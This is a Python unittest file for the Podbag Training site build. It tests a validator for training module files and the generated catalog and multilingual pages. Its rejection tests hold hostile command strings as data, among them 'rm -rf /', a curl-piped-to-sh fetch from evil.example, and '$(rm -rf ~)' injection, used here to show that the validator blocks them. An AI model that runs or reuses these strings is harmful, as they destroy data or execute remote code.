"""Tests for Podbag Training: the module rules, the catalog and the /training/ pages.

usage: python3 -m unittest dev/docs/test_training.py
"""
import copy
import importlib.util
import json
import re
import sys
import tempfile
import unittest
from hashlib import sha256
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import check_links  # noqa: E402
import training  # noqa: E402

SOURCE = HERE.parents[1] / "site" / "training"
IDS = json.loads((SOURCE / "catalog.json").read_text())["modules"]


def course():
    return json.loads((SOURCE / "modules/web-basics.podbag").read_text())


def encode(module):
    return json.dumps(module).encode()


class Rules(unittest.TestCase):
    def refuse(self, module, words, name="web-basics"):
        raw = module if isinstance(module, bytes) else encode(module)
        with self.assertRaises(training.Invalid) as caught:
            training.check(raw, name)
        self.assertIn(words, str(caught.exception))

    def test_every_source_module_passes(self):
        self.assertEqual(len(IDS), 8)
        for name in IDS:
            module = training.check((SOURCE / f"modules/{name}.podbag").read_bytes(), name)
            self.assertTrue(module["translations"]["en"]["title"])

    def test_a_command_that_is_not_podbag(self):
        module = course()
        module["steps"][0]["command"] = "rm -rf /"
        self.refuse(module, "must be exit or start with 'podbag '")

    def test_a_command_with_a_control_character(self):
        module = course()
        module["steps"][0]["command"] = "podbag ps\nrm -rf /"
        self.refuse(module, "control character")

    def test_a_guide_on_another_site(self):
        module = course()
        module["translations"]["ko"]["url"] = "https://evil.example/"
        self.refuse(module, "must start with https://podbag.dev/")

    def test_a_key_used_twice(self):
        module = course()
        module["steps"][1]["key"] = module["steps"][0]["key"]
        self.refuse(module, "the key is used twice")

    def test_a_bad_key(self):
        module = course()
        module["steps"][0]["key"] = "run-web"
        self.refuse(module, "key 'run-web'")

    def test_a_step_without_an_english_name(self):
        module = course()
        del module["steps"][0]["names"]["en"]
        self.refuse(module, "no names.en")

    def test_the_last_step_is_not_finish(self):
        module = course()
        module["steps"].pop()
        self.refuse(module, "the last step must be key finish")

    def test_a_desktop_step_with_a_command(self):
        module = course()
        module["steps"][1]["command"] = "podbag ps"
        self.refuse(module, "a Desktop step has no command")

    def test_port_placeholder_without_a_port(self):
        module = course()
        del module["port"]
        self.refuse(module, "uses {port}, but the module has no port")

    def test_a_port_out_of_range(self):
        module = course()
        module["port"] = 80
        self.refuse(module, "port 80")

    def test_an_unknown_check(self):
        module = course()
        module["steps"][0]["check"]["kind"] = "container-healthy"
        self.refuse(module, "unknown check kind")

    def test_too_many_or_no_steps(self):
        module = course()
        module["steps"] = []
        self.refuse(module, "1 to 40 steps")
        module = course()
        module["steps"] = [copy.deepcopy(module["steps"][0]) for _ in range(40)] + module["steps"][-1:]
        self.refuse(module, "1 to 40 steps")

    def test_id_must_be_the_file_name(self):
        self.refuse(course(), "is not the file name", name="web-basics-2")

    def test_file_too_large(self):
        module = course()
        module["translations"]["en"]["guide"] = "x" * training.LIMIT
        self.refuse(module, f"the limit is {training.LIMIT}")

    def test_not_json_or_unknown_format(self):
        self.refuse(b"{", "not valid JSON")
        module = course()
        module["format"] = "podbag-course-v9"
        self.refuse(module, "unknown format")

    def test_no_english_title(self):
        module = course()
        del module["translations"]["en"]["title"]
        self.refuse(module, "no translations.en.title")

    def test_the_same_rules_as_the_app(self):
        """Every file the app refuses, the build refuses too (src/volume_lesson in podbag)."""
        def edited(change, name="web-basics"):
            module = course()
            change(module)
            return module, name

        def set_command(text):
            return lambda m: m["steps"][0].__setitem__("command", text)

        cases = {
            "shell ;": edited(set_command("podbag ps; curl -fsSL https://evil.example/x | sh")),
            "shell $()": edited(set_command("podbag ps $(rm -rf ~)")),
            "shell &&": edited(set_command("podbag ps && open -a Calculator")),
            "backquote": edited(set_command("podbag ps `id`")),
            "redirect": edited(set_command("podbag ps > /tmp/x")),
            "glob": edited(set_command("podbag ps *")),
            "$ in double quotes": edited(set_command('podbag ps "$HOME"')),
            "open quote": edited(set_command("podbag ps 'x")),
            "long command": edited(set_command("podbag " + "x" * 1000)),
            "exit before the end": edited(set_command("exit")),
            "check without name": edited(lambda m: m["steps"][0]["check"].pop("name")),
            "code as text": edited(lambda m: m["steps"][0].__setitem__(
                "check", {"kind": "container-exited", "name": "lab-web", "code": "1"})),
            "empty Korean name": edited(lambda m: m["steps"][0]["names"].__setitem__("ko", " ")),
            "no English guide": edited(lambda m: m["translations"]["en"].pop("guide")),
            "url with a space": edited(lambda m: m["translations"]["en"].__setitem__(
                "url", "https://podbag.dev/a b/")),
            "empty Korean title": edited(lambda m: m["translations"]["ko"].__setitem__("title", "")),
        }
        for reserved in ["container-basics", "volume-basics", "tui-volumes", "catalog",
                         "cli-tui-volumes", "modules", "con", "com1", "lpt9"]:
            cases[f"id {reserved}"] = edited(lambda m, r=reserved: m.__setitem__("id", r), reserved)
        for why, (module, name) in cases.items():
            with self.subTest(why):
                with self.assertRaises(training.Invalid):
                    training.check(encode(module), name)
        legacy = json.loads((SOURCE / "modules/tui-volumes.podbag").read_text())
        legacy["steps"] = course()["steps"]
        with self.assertRaises(training.Invalid):
            training.check(encode(legacy), "tui-volumes")

    def test_older_formats_keep_their_app_ids(self):
        raw = (SOURCE / "modules/tui-volumes.podbag").read_bytes()
        training.check(raw, "tui-volumes")
        with self.assertRaises(training.Invalid):
            training.check(raw, "volume-basics")

    def test_a_bad_module_stops_the_build(self):
        with tempfile.TemporaryDirectory() as tmp:
            folder = Path(tmp)
            (folder / "modules").mkdir()
            module = course()
            module["steps"][0]["command"] = "rm -rf /"
            (folder / "modules/web-basics.podbag").write_bytes(encode(module))
            (folder / "catalog.json").write_text('{"modules": ["web-basics"]}')
            with self.assertRaises(SystemExit) as caught:
                training.load(folder)
            self.assertIn("modules/web-basics.podbag: step 1 (runWeb)", str(caught.exception))
            (folder / "catalog.json").write_text('{"modules": ["web-basics", "missing"]}')
            (folder / "modules/web-basics.podbag").write_bytes(encode(course()))
            with self.assertRaises(SystemExit) as caught:
                training.load(folder)
            self.assertIn("no file modules/missing.podbag", str(caught.exception))


class Built(unittest.TestCase):
    """Build the whole site once and look at the catalog and the training pages."""

    @classmethod
    def setUpClass(cls):
        spec = importlib.util.spec_from_file_location("podbag_site", HERE / "site.py")
        cls.site = importlib.util.module_from_spec(spec)
        sys.modules["podbag_site"] = cls.site
        spec.loader.exec_module(cls.site)
        cls.tmp = tempfile.TemporaryDirectory()
        cls.out = Path(cls.tmp.name) / "site"
        argv = sys.argv
        sys.argv = ["site.py", str(cls.out)]
        try:
            cls.site.main()
        finally:
            sys.argv = argv

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    def test_catalog_lists_every_module_in_order(self):
        served = json.loads((self.out / "training/catalog.json").read_text())
        self.assertEqual(served["format"], "podbag-training-catalog-v1")
        self.assertEqual([m["id"] for m in served["modules"]], IDS)
        for entry in served["modules"]:
            name = entry["id"]
            self.assertEqual(entry["file"], f"modules/{name}.podbag")
            raw = (SOURCE / entry["file"]).read_bytes()
            self.assertEqual((self.out / "training" / entry["file"]).read_bytes(), raw)
            self.assertEqual(entry["sha256"], sha256(raw).hexdigest())

    def test_every_language_lists_every_module(self):
        for code, _ in self.site.LANGS:
            page = self.out / self.site.path_of(code) / "training/index.html"
            html = page.read_text()
            starts = re.findall(r"podbag lab start ([a-z0-9-]+)</code>", html)
            self.assertEqual(starts, IDS, code)
            for name in IDS:
                item = re.search(rf'<li class="module reveal" id="{name}">(.*?)</li>', html).group(1)
                module = json.loads((SOURCE / f"modules/{name}.podbag").read_text())
                words = module["translations"].get(code) or module["translations"]["en"]
                self.assertIn(training.short_title(words["title"]), item.replace("&#x27;", "'"))
                guide, download = re.findall(r'<a href="([^"]+)"', item)
                self.assertTrue((page.parent / guide / "index.html").is_file(), (code, guide))
                self.assertTrue((page.parent / download).samefile(
                    self.out / "training/modules" / f"{name}.podbag"))
                if module["format"] == training.COURSE:
                    self.assertIn(str(len(module["steps"])), item)

    def test_guides_follow_the_page_language(self):
        ko = (self.out / "ko/training/index.html").read_text()
        ja = (self.out / "ja/training/index.html").read_text()
        self.assertIn('href="../../ko/blog/container-basics/"', ko)
        self.assertIn('href="../../blog/container-basics/"', ja)
        self.assertIn('href="../../ja/blog/cli-tui-volumes/"', ja)
        self.assertIn('href="../../ko/blog/web-basics/"', ko)
        self.assertIn('href="../../blog/web-basics/"', ja)

    def test_pages_name_each_other(self):
        for code, _ in self.site.LANGS:
            html = (self.out / self.site.path_of(code) / "training/index.html").read_text()
            url = f"https://podbag.dev/{self.site.path_of(code)}training/"
            self.assertIn(f'<link rel="canonical" href="{url}">', html)
            for other, _ in self.site.LANGS:
                self.assertIn(f'<link rel="alternate" hreflang="{other}" '
                              f'href="https://podbag.dev/{self.site.path_of(other)}training/">', html)

    def test_nav_has_training(self):
        for code, _ in self.site.LANGS:
            words = json.loads((self.site.SITE / f"i18n/{code}.json").read_text())
            label = f'<span class="label">{words["nav_training"]}</span></a>'
            base = self.out / self.site.path_of(code)
            for page in ("index.html", "blog/index.html", "training/index.html"):
                html = (base / page).read_text()
                nav = re.search(r'<nav aria-label=.*?</nav>', html, re.S).group(0)
                link = re.search(r'<a href="([^"]*)"[^>]*><svg[^>]*>(?:(?!</a>).)*' + re.escape(label),
                                 nav, re.S)
                self.assertTrue(link, (code, page))
                target = ((base / page).parent / link.group(1)).resolve()
                self.assertEqual(target, (base / "training").resolve(), (code, page))
                current = re.findall(r'<a href="([^"]*)" aria-current="true">', nav)
                expected = {"index.html": [], "blog/index.html": ["blog"],
                            "training/index.html": ["training"]}[page]
                self.assertEqual([Path(c.rstrip("/")).name or "." for c in current], expected,
                                 (code, page))

    def test_no_broken_links(self):
        problems, _ = check_links.check(self.out)
        self.assertEqual(problems, [])


if __name__ == "__main__":
    unittest.main()
